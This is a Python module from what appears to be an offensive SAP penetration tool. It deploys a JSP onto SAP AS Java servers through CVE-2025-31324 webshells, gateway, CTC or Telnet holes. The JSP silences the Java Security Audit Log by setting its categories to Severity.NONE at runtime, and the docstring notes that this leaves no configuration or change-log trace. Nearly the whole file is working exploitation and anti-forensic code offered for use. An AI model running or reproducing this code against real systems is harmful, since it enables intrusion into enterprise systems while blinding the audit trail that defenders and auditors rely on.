#!/usr/bin/env python3
"""Java Security Audit Log suppression via deployed LogController JSP.

Deploys a small JSP onto an AS Java target that uses the standard
``com.sap.tc.logging.Category`` / ``Severity`` API to read and
manipulate the effective severity of the Java Security Audit Log
categories at runtime.

Three HTTP actions:

  ``?action=read``
      Return the current effective severity for each target category
      as a pipe-separated list of ``path=int`` pairs.

  ``?action=suppress``
      Set every target category's effective severity to
      ``Severity.NONE`` (suppresses all audit events).

  ``?action=restore&baselines=path%3Dint%7Cpath%3Dint``
      Restore each category to its captured baseline severity.

All changes are **runtime-only** — they live in the JVM's heap
(``LogController`` singletons).  No config file is modified, no NWA
change-log entry is written, and a JVM restart auto-restores the
persisted baseline.  In NWA Log Configuration the suppressed
categories show severity origin "Runtime Override".

Deployment reuses the existing CVE-2025-31324 / CTC / Telnet / GW
pipeline from ``sapmap_exploit``.
"""

from __future__ import annotations

import logging
import re
import ssl
import urllib.error
import urllib.parse
import urllib.request

logger = logging.getLogger(__name__)

_UA = "SAPMAP/1.0"

# ---------------------------------------------------------------------------
# Target categories — Java Security Audit Log
# ---------------------------------------------------------------------------

JAVA_SAL_CATEGORIES = (
    "/System/Security/Audit",
    "/System/Security/Audit/ACLs",
    "/System/Security/Audit/Configuration",
    "/System/Security/Audit/PermissionCheck",
    "/System/Security/Audit/PrincipalModification",
    "/System/Security/Audit/UserMapping",
)


# ---------------------------------------------------------------------------
# JSP template
# ---------------------------------------------------------------------------

LOGCTL_JSP = r'''<%@ page import="com.sap.tc.logging.*" %>
<%@ page contentType="text/plain;charset=UTF-8" %>
<%
String action = request.getParameter("action");
if (action == null || action.length() == 0) action = "status";

String[] cats = {
    "/System/Security/Audit",
    "/System/Security/Audit/ACLs",
    "/System/Security/Audit/Configuration",
    "/System/Security/Audit/PermissionCheck",
    "/System/Security/Audit/PrincipalModification",
    "/System/Security/Audit/UserMapping"
};

StringBuilder sb = new StringBuilder();

if ("read".equals(action)) {
    for (int i = 0; i < cats.length; i++) {
        if (i > 0) sb.append("|");
        try {
            Category c = Category.getCategory(cats[i]);
            sb.append(cats[i]).append("=").append(c.getEffectiveSeverity());
        } catch (Exception e) {
            sb.append(cats[i]).append("=ERR:").append(e.getMessage());
        }
    }
    out.print(sb.toString());
} else if ("suppress".equals(action)) {
    int ok = 0;
    int fail = 0;
    for (String cat : cats) {
        try {
            Category c = Category.getCategory(cat);
            c.setEffectiveSeverity(Severity.NONE);
            ok++;
        } catch (Exception e) {
            fail++;
            sb.append("ERR:").append(cat).append(":").append(e.getMessage()).append("|");
        }
    }
    out.print("OK=" + ok + "|FAIL=" + fail);
    if (sb.length() > 0) out.print("|" + sb.toString());
} else if ("restore".equals(action)) {
    String baselines = request.getParameter("baselines");
    int ok = 0;
    int fail = 0;
    if (baselines != null && baselines.length() > 0) {
        String[] pairs = baselines.split("\\|");
        for (String pair : pairs) {
            int eq = pair.indexOf('=');
            if (eq > 0) {
                String catName = pair.substring(0, eq).trim();
                String sevStr = pair.substring(eq + 1).trim();
                try {
                    int sev = Integer.parseInt(sevStr);
                    Category c = Category.getCategory(catName);
                    c.setEffectiveSeverity(sev);
                    ok++;
                } catch (Exception e) {
                    fail++;
                }
            }
        }
    }
    out.print("OK=" + ok + "|FAIL=" + fail);
} else {
    out.print("LOGCTL_READY");
}
%>'''


# ---------------------------------------------------------------------------
# HTTP invoke helper
# ---------------------------------------------------------------------------

def invoke_logctl(url: str, action: str,
                  baselines: str = "",
                  timeout: float = 15.0) -> dict:
    """Call the logctl JSP with ``?action=<action>`` and return parsed result.

    Returns ``{ok, action, raw, categories, error}``.

    ``categories`` is a dict mapping category path → effective severity
    (int) on action=read, or empty on other actions.
    """
    result = {"ok": False, "action": action, "raw": "",
              "categories": {}, "suppress_ok": 0, "suppress_fail": 0,
              "error": ""}

    params = {"action": action}
    if action == "restore" and baselines:
        params["baselines"] = baselines
    qs = urllib.parse.urlencode(params)
    full_url = f"{url}?{qs}"

    ctx = ssl._create_unverified_context()
    req = urllib.request.Request(full_url, headers={"User-Agent": _UA})
    try:
        with urllib.request.urlopen(req, timeout=timeout,
                                    context=ctx) as r:
            body = r.read().decode("utf-8", errors="replace").strip()
            result["raw"] = body
    except urllib.error.HTTPError as e:
        result["error"] = f"HTTP {e.code}"
        return result
    except Exception as e:
        result["error"] = str(e)[:200]
        return result

    if action == "read":
        for pair in body.split("|"):
            eq = pair.find("=")
            if eq <= 0:
                continue
            cat = pair[:eq].strip()
            val = pair[eq + 1:].strip()
            if val.startswith("ERR:"):
                result["error"] = f"{cat}: {val}"
                continue
            try:
                result["categories"][cat] = int(val)
            except ValueError:
                result["error"] = f"{cat}: non-int severity {val!r}"
        result["ok"] = bool(result["categories"]) and not result["error"]
    elif action in ("suppress", "restore"):
        for pair in body.split("|"):
            if pair.startswith("OK="):
                try:
                    result["suppress_ok"] = int(pair.split("=", 1)[1])
                except ValueError:
                    pass
            elif pair.startswith("FAIL="):
                try:
                    result["suppress_fail"] = int(pair.split("=", 1)[1])
                except ValueError:
                    pass
            elif pair.startswith("ERR:"):
                result["error"] = pair
        result["ok"] = result["suppress_ok"] > 0 and result["suppress_fail"] == 0
    elif action == "status":
        result["ok"] = "LOGCTL_READY" in body
    else:
        result["error"] = f"unknown action {action!r}"

    return result


def baselines_to_wire(categories: dict) -> str:
    """Encode a ``{catpath: int_severity}`` dict into the wire format
    the restore action expects: ``path=int|path=int|...``."""
    return "|".join(f"{k}={v}" for k, v in categories.items())


# ---------------------------------------------------------------------------
# JSP deployment
# ---------------------------------------------------------------------------

def deploy_logctl_jsp(node) -> str:
    """Deploy the logctl JSP onto ``node`` using the existing pipeline.

    Returns the reachable URL on success, or "" on failure.
    """
    from sapmap_exploit import (
        _deploy_jsp_via_ctc, _deploy_jsp_via_telnet,
        _ctc_deploy_available, _telnet_deploy_available,
        _deploy_jsp_via_gw, _java_jsp_target_path,
        execute_cve_2025_31324_via_shell,
    )
    from sap_cve_2025_31324 import write_file_via_shell
    from sap_java_runner import _wait_for_jsp_ready
    import random as _r, string as _s
    from datetime import datetime as _dt

    http_port = getattr(node, "cve_2025_31324_port", 0) or 0
    if not http_port:
        for inst in node.instances:
            for p, svc in (inst.ports or {}).items():
                if svc == "java_http":
                    http_port = p
                    break
            if http_port:
                break
    if not http_port:
        print(f"[-] {node.sid}: no Java HTTP port known — "
              f"cannot deploy logctl JSP")
        return ""

    java_inst = (http_port - 50000) // 100
    jsp_name = ("lc" + "".join(_r.choice(_s.ascii_lowercase)
                               for _ in range(6)) + ".jsp")
    target_path = _java_jsp_target_path(node, java_inst, jsp_name)
    jsp_url = f"http://{node.ip or node.hostname}:{http_port}/irj/{jsp_name}"
    jsp_bytes = LOGCTL_JSP.encode("utf-8")

    _ctc_ok = _ctc_deploy_available(node)
    _telnet_ok = (not _ctc_ok) and _telnet_deploy_available(node)
    delivery = ("CVE-2025-31324" if node.cve_2025_31324_vulnerable
                else "GW SAPXPG" if node.gw_vulnerable
                else "CTC ConfigServlet" if _ctc_ok
                else "Telnet" if _telnet_ok
                else "NONE")
    print(f"[*] {node.sid}: deploying logctl JSP via {delivery}")
    print(f"[*] {node.sid}:   target path: {target_path}")
    print(f"[*] {node.sid}:   reachable URL: {jsp_url}")

    ok = False
    if node.cve_2025_31324_vulnerable:
        execute_cve_2025_31324_via_shell(node, "cmd.exe /C echo sapmap_prime")
        if not node.cve_2025_31324_shells:
            print(f"[-] {node.sid}: no JSP webshell available")
            return ""
        shell_url = node.cve_2025_31324_shells[-1]["url"]
        w = write_file_via_shell(shell_url, target_path, jsp_bytes)
        ok = w.get("success", False)
        if not ok:
            print(f"[-] {node.sid}: logctl JSP write failed: "
                  f"{w.get('error')}")
            return ""
    elif node.gw_vulnerable:
        w = _deploy_jsp_via_gw(node, jsp_bytes, target_path,
                               label="logctl JSP")
        ok = w.get("success", False)
        if not ok:
            print(f"[-] {node.sid}: logctl JSP GW write failed: "
                  f"{w.get('error', '?')}")
            return ""
    elif _ctc_ok or _telnet_ok:
        r = None
        if _ctc_ok:
            r = _deploy_jsp_via_ctc(node, jsp_bytes, target_path,
                                    label="logctl JSP")
        if (not r or not r.get("success")) and _telnet_deploy_available(node):
            r = _deploy_jsp_via_telnet(node, jsp_bytes, target_path,
                                      label="logctl JSP")
        ok = r and r.get("success", False)
        if not ok:
            print(f"[-] {node.sid}: logctl JSP deploy failed: "
                  f"{(r or {}).get('error', '?')}")
            return ""
    else:
        print(f"[-] {node.sid}: no deployment path for logctl JSP")
        return ""

    if not _wait_for_jsp_ready(jsp_url, sid=node.sid, label="logctl JSP"):
        print(f"[-] {node.sid}: logctl JSP never became reachable")
        return ""

    # Verify the JSP is functional.
    status = invoke_logctl(jsp_url, "status")
    if not status["ok"]:
        print(f"[-] {node.sid}: logctl JSP status check failed: "
              f"{status.get('error', status.get('raw', '?'))}")
        return ""

    print(f"[+] {node.sid}: logctl JSP deployed and ready at {jsp_url}")
    return jsp_url
